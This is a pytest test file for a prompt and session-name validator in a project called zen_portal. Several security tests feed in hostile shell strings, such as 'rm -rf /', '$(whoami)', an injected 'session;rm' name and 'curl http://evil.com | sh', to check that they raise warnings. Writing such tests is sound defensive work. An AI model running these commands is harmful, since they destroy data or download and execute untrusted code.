"""Tests for input validation."""

import pytest
from pathlib import Path
from unittest.mock import MagicMock

from zen_portal.services.validation import (
    validate_prompt,
    validate_session_name,
    MAX_PROMPT_LENGTH,
    ValidationResult,
    SessionValidator,
)


class TestValidatePrompt:
    """Tests for prompt validation."""

    def test_valid_prompt(self):
        """Accept normal prompts."""
        valid, error = validate_prompt("Add a dark theme toggle")
        assert valid is True
        assert error is None

    def test_empty_prompt(self):
        """Reject empty prompts."""
        valid, error = validate_prompt("")
        assert valid is False
        assert "empty" in error.lower()

    def test_whitespace_only_prompt(self):
        """Reject whitespace-only prompts."""
        valid, error = validate_prompt("   \n\t  ")
        assert valid is False
        assert "empty" in error.lower()

    def test_prompt_too_long(self):
        """Reject prompts exceeding max length."""
        long_prompt = "x" * (MAX_PROMPT_LENGTH + 1)
        valid, error = validate_prompt(long_prompt)
        assert valid is False
        assert "too long" in error.lower()

    def test_prompt_at_max_length(self):
        """Accept prompts at exactly max length."""
        max_prompt = "x" * MAX_PROMPT_LENGTH
        valid, error = validate_prompt(max_prompt)
        assert valid is True

    # Security: Suspicious patterns (now warnings, not rejections)
    # The new SessionValidator treats these as warnings since they
    # could be legitimate code examples in prompts.

    def test_backticks_warning(self):
        """Warn on prompts with backticks (command substitution)."""
        validator = SessionValidator()
        result = validator.validate_prompt("test `rm -rf /`")
        assert result.is_valid  # Warning, not rejection
        assert result.first_warning is not None
        assert "unsafe" in result.first_warning.lower()

    def test_command_substitution_warning(self):
        """Warn on prompts with $() command substitution."""
        validator = SessionValidator()
        result = validator.validate_prompt("test $(whoami)")
        assert result.is_valid  # Warning, not rejection
        assert result.first_warning is not None

    def test_command_chaining_warning(self):
        """Warn on prompts with && command chaining."""
        validator = SessionValidator()
        result = validator.validate_prompt("test && rm -rf /")
        assert result.is_valid  # Warning, not rejection
        assert result.first_warning is not None

    def test_or_chaining_warning(self):
        """Warn on prompts with || command chaining."""
        validator = SessionValidator()
        result = validator.validate_prompt("test || echo pwned")
        assert result.is_valid  # Warning, not rejection
        assert result.first_warning is not None

    def test_semicolon_command_warning(self):
        """Warn on prompts with semicolon command separation."""
        validator = SessionValidator()
        result = validator.validate_prompt("test; rm -rf /")
        assert result.is_valid  # Warning, not rejection
        assert result.first_warning is not None

    def test_rm_rf_warning(self):
        """Warn on prompts with rm -rf."""
        validator = SessionValidator()
        result = validator.validate_prompt("please run rm -rf /tmp")
        assert result.is_valid  # Warning, not rejection
        assert result.first_warning is not None

    def test_curl_pipe_shell_warning(self):
        """Warn on prompts with curl | sh pattern."""
        validator = SessionValidator()
        result = validator.validate_prompt("curl http://evil.com | sh")
        assert result.is_valid  # Warning, not rejection
        assert result.first_warning is not None

    # Allowed patterns that look suspicious but aren't

    def test_normal_code_with_dollar(self):
        """Accept prompts mentioning $ in code context."""
        valid, error = validate_prompt("Add a $state variable")
        assert valid is True

    def test_multiline_prompt(self):
        """Accept multiline prompts."""
        valid, error = validate_prompt("First line\nSecond line\nThird line")
        assert valid is True


class TestValidateSessionName:
    """Tests for session name validation."""

    def test_valid_name(self):
        """Accept valid session names."""
        valid, error = validate_session_name("zen-abc123")
        assert valid is True

    def test_empty_name(self):
        """Reject empty names."""
        valid, error = validate_session_name("")
        assert valid is False
        assert "empty" in error.lower()

    def test_name_with_spaces(self):
        """Reject names with spaces."""
        valid, error = validate_session_name("my session")
        assert valid is False
        assert "alphanumeric" in error.lower()

    def test_name_with_special_chars(self):
        """Reject names with special characters."""
        valid, error = validate_session_name("session;rm")
        assert valid is False

    def test_name_too_long(self):
        """Reject names exceeding max length."""
        long_name = "x" * 65
        valid, error = validate_session_name(long_name)
        assert valid is False
        assert "too long" in error.lower()

    def test_name_with_underscore(self):
        """Accept names with underscores."""
        valid, error = validate_session_name("my_session_123")
        assert valid is True

    def test_name_with_hyphen(self):
        """Accept names with hyphens."""
        valid, error = validate_session_name("my-session-123")
        assert valid is True


class TestValidationResult:
    """Tests for ValidationResult dataclass."""

    def test_default_valid(self):
        """Default result is valid with no issues."""
        result = ValidationResult()
        assert result.is_valid
        assert not result.has_issues
        assert result.first_error is None
        assert result.first_warning is None

    def test_with_errors(self):
        """Result with errors is invalid."""
        result = ValidationResult(is_valid=False, errors=["error1", "error2"])
        assert not result.is_valid
        assert result.has_issues
        assert result.first_error == "error1"
        assert result.first_issue == "error1"

    def test_with_warnings(self):
        """Result with warnings is still valid."""
        result = ValidationResult(is_valid=True, warnings=["warning1"])
        assert result.is_valid
        assert result.has_issues
        assert result.first_warning == "warning1"
        assert result.first_issue == "warning1"

    def test_merge_both_valid(self):
        """Merging two valid results stays valid."""
        r1 = ValidationResult()
        r2 = ValidationResult()
        merged = r1.merge(r2)
        assert merged.is_valid

    def test_merge_one_invalid(self):
        """Merging with invalid result becomes invalid."""
        r1 = ValidationResult()
        r2 = ValidationResult(is_valid=False, errors=["error"])
        merged = r1.merge(r2)
        assert not merged.is_valid
        assert "error" in merged.errors

    def test_merge_combines_issues(self):
        """Merging combines errors and warnings."""
        r1 = ValidationResult(errors=["e1"], warnings=["w1"])
        r2 = ValidationResult(errors=["e2"], warnings=["w2"])
        merged = r1.merge(r2)
        assert merged.errors == ["e1", "e2"]
        assert merged.warnings == ["w1", "w2"]


class TestSessionValidator:
    """Tests for SessionValidator class."""

    def test_validate_name_valid(self):
        """Accept valid session names."""
        validator = SessionValidator()
        result = validator.validate_name("my-session")
        assert result.is_valid
        assert not result.has_issues

    def test_validate_name_empty(self):
        """Reject empty names."""
        validator = SessionValidator()
        result = validator.validate_name("")
        assert not result.is_valid
        assert "empty" in result.first_error.lower()

    def test_validate_name_whitespace(self):
        """Reject whitespace-only names."""
        validator = SessionValidator()
        result = validator.validate_name("   ")
        assert not result.is_valid

    def test_validate_name_too_long(self):
        """Reject names exceeding max length."""
        validator = SessionValidator()
        result = validator.validate_name("x" * 65)
        assert not result.is_valid
        assert "too long" in result.first_error.lower()

    def test_validate_name_duplicate_warning(self):
        """Warn on duplicate names."""
        validator = SessionValidator()
        result = validator.validate_name("existing", existing_names={"existing", "other"})
        assert result.is_valid  # Warning, not error
        assert "already exists" in result.first_warning

    def test_validate_name_invalid_chars(self):
        """Reject names with invalid characters."""
        validator = SessionValidator()
        result = validator.validate_name("bad name!")
        assert not result.is_valid
        assert "alphanumeric" in result.first_error.lower()

    def test_validate_directory_valid(self, tmp_path):
        """Accept valid directories."""
        validator = SessionValidator()
        result = validator.validate_directory(str(tmp_path))
        assert result.is_valid

    def test_validate_directory_empty(self):
        """Reject empty directory."""
        validator = SessionValidator()
        result = validator.validate_directory("")
        assert not result.is_valid
        assert "empty" in result.first_error.lower()

    def test_validate_directory_not_exists(self):
        """Reject non-existent directories."""
        validator = SessionValidator()
        result = validator.validate_directory("/nonexistent/path/12345")
        assert not result.is_valid
        assert "does not exist" in result.first_error.lower()

    def test_validate_directory_expands_tilde(self, tmp_path, monkeypatch):
        """Expand ~ in paths."""
        validator = SessionValidator()
        # Use a path we know exists
        result = validator.validate_directory("~")
        assert result.is_valid

    def test_validate_prompt_empty_not_required(self):
        """Empty prompt ok when not required."""
        validator = SessionValidator()
        result = validator.validate_prompt("", required=False)
        assert result.is_valid

    def test_validate_prompt_empty_required(self):
        """Empty prompt rejected when required."""
        validator = SessionValidator()
        result = validator.validate_prompt("", required=True)
        assert not result.is_valid

    def test_validate_prompt_suspicious_pattern(self):
        """Warn on suspicious patterns."""
        validator = SessionValidator()
        result = validator.validate_prompt("test `rm -rf /`")
        assert result.is_valid  # Warning, not error
        assert "unsafe" in result.first_warning.lower()

    def test_validate_for_creation_all_valid(self, tmp_path):
        """Full validation with all valid inputs."""
        validator = SessionValidator()
        result = validator.validate_for_creation(
            name="test-session",
            directory=str(tmp_path),
            prompt="do something",
        )
        assert result.is_valid

    def test_validate_for_creation_invalid_name(self, tmp_path):
        """Full validation catches invalid name."""
        validator = SessionValidator()
        result = validator.validate_for_creation(
            name="",
            directory=str(tmp_path),
        )
        assert not result.is_valid
        assert "name" in result.first_error.lower()

    def test_validate_for_creation_invalid_directory(self):
        """Full validation catches invalid directory."""
        validator = SessionValidator()
        result = validator.validate_for_creation(
            name="valid-name",
            directory="/nonexistent/12345",
        )
        assert not result.is_valid
        assert "exist" in result.first_error.lower()

    def test_validate_for_creation_with_existing_sessions(self, tmp_path):
        """Full validation checks duplicates."""
        validator = SessionValidator()
        mock_session = MagicMock()
        mock_session.name = "existing"
        result = validator.validate_for_creation(
            name="existing",
            directory=str(tmp_path),
            existing_sessions=[mock_session],
        )
        assert result.is_valid  # Warning only
        assert "already exists" in result.first_warning
